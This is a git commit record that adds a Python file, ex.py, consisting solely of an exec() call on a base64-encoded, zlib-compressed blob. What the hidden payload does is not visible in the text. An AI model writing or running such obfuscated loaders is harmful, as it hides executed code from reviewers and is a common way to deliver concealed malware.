b672c4eab01ec9f981dacb76addafc7849500c8c
Sreetx <98646763+Sreetx@users.noreply.github.com>
2024-12-18 16:41:12 +0700

    Add files via upload

---
+++ ex.py
@@ -0,0 +1,3 @@
+import zlib, marshal, base64
+
+exec(zlib.decompress(base64.b64decode("eJwNyrERgCAMAMCeKSIN2LCHrqAWURFzB4EjWNA4u379lEquDbKoUomb1SvD8m4wMcGNQpE7Ouf0qLI46dJ8svqiEH0DMyMHZIhPQTgJ5NnlqLT7wfxffZ/iHi8=")))
